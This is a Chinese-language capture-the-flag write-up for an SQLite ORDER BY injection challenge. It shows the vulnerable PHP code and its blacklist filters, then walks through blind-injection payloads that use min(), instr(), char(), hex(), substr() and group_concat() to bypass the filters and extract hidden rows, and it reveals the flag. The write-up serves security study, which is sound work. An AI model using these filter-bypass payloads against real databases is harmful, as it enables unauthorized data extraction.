### SQL

#### 一、思路

```
查看页面源码，发现 SQLite 数据库 ORDER BY 注入点
分析两层 WAF 过滤规则（字符黑名单 + 关键词黑名单）
利用两行数据的排序差异构造布尔盲注信号
用 char() 绕过引号，instr() 绕过比较运算符, min() 绕过 and
子查询 + group_concat() 绕过 WHERE 
hex() + substr() 逐字符提取 sqlite_master 表结构
定位 flag 存储位置，逐字符提取出完整 flag
```

#### 二、分析

##### 2.1 代码审计

```php
$order = $_GET['order'] ?? 'id';

//字符黑名单
if (preg_match('/[\'":;=<>!|&~^%\-\+\*\/]/', $order)) {
    die("安全拦截：请求参数异常 (0x01)");
}

//关键词黑名单
if (preg_match('/\b(in|is|like|glob|match|regexp|and|or|not|iif|case|if|when|then|else|where|union|join|nullif|coalesce)\b/i', $order)) {
    die("安全拦截：请求参数异常 (0x02)");
}

$db = new PDO("sqlite:/tmp/ctf.db");
$query = "SELECT id, name, upload_date FROM files WHERE is_secret = 0 ORDER BY $order";
$stmt = $db->query($query);
```

关键信息：

| 项目 | 内容 |
|---|---|
| 数据库 | SQLite |
| 注入点 | `ORDER BY $order` 直接拼接 |
| 已知列 | id, name, is_secret, upload_date |
| 查询条件 | `WHERE is_secret = 0` 机密文档被过滤 |
| 回显 | 成功则返回 JSON 数据，失败返回"数据库查询异常" |

被过滤的字符：`' " : ; = < > ! | & ~ ^ % - + * /`

被过滤的关键词：`in, is, like, glob, match, regexp, and, or, not, iif, case, if, when, then, else, where, union, join, nullif, coalesce`

##### 2.3 布尔盲注原理

页面只有两条公开数据

| id | name |
|---|---|
| 1 | Zebra_Core_System_Docs |
| 2 | Apple_Network_Topology |

测试 `order=substr(name,1,1)`，发现排序结果反转

```json
{"data":[{"id":2,"name":"Apple_Network_Topology"},{"id":1,"name":"Zebra_Core_System_Docs"}]}
```

substr 取首字符 'A' < 'Z'，所以 Apple 排前面

由此建立盲注信号

Zebra 在前（正常顺序） 条件为假
Apple 在前（反转顺序） 条件为真

##### 2.4 核心 Payload 构造

利用 `min()` 函数把"行特征"和"数据库条件"组合起来

```sql
min(instr(name, char(90)), 条件值)
```

`instr(name, char(90))` 检查 name 里有没有 'Z'
id=1（Zebra）：返回 1
id=2（Apple）：返回 0

当条件值 = 0（条件为假）
id=1: `min(1, 0) = 0`
id=2: `min(0, 0) = 0`
两行排序键相同 → 保持原始顺序（Zebra 在前）

当条件值 > 0（条件为真）
id=1: `min(1, 条件值) = 1`
id=2: `min(0, 条件值) = 0`
排序键不同 → 排序反转（Apple 在前）

实现布尔盲注，用 `min()` 代替了被过滤的 `and`

##### 2.5 绕过过滤

| 被过滤的功能 | 绕过方法 |
|---|---|
| 引号 `'`（字符串） | `char(97,98,99)` 函数生成字符串 |
| 等号 `=`（比较） | `instr()` 函数返回 0/1 |
| `and`（逻辑与） | `min(a, b)`  |
| `where`（筛选行） | 子查询 + `group_concat()` 全量提取 |
| 逐字符提取 | `hex()` + `substr()` |

##### 2.6 提取数据库结构

利用子查询绕过 WHERE 限制，从 `sqlite_master` 提取表名

```sql
(SELECT group_concat(name) FROM sqlite_master)
```

逐字符提取 hex，得到表名

```
files,sqlite_sequence
```

再提取建表语句（`sql` 列）

```sql
CREATE TABLE files (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    name TEXT NOT NULL,
    is_secret INTEGER DEFAULT 0,
    upload_date TEXT
)
```

确认 files 表没有 flag 列
Flag 藏在某一行的 `name` 字段中（`is_secret=1` 的机密文档）

##### 2.7 提取所有文档名

直接从 files 表聚合所有 name（绕过 `WHERE is_secret = 0`）：

```sql
(SELECT group_concat(name) FROM files)
```

用 `hex()` + `substr()` 逐字符提取，脚本遍历 16 个 hex 字符（0-9, A-F）猜每个位置，最终得到

```
Zebra_Core_System_Docs,Apple_Network_Topology,GUET{SQL1t3_fUnct10ns_0nly_N0_sp4c3s}
```

#### 三、最终 Flag

```
GUET{SQL1t3_fUnct10ns_0nly_N0_sp4c3s}
```
SQLite functions only, no spaces
全程只用数据库内置函数完成注入，不需要任何比较运算符或逻辑控制流


[自动化盲注脚本 SQL.py](附件\script\SQL\SQL.py)
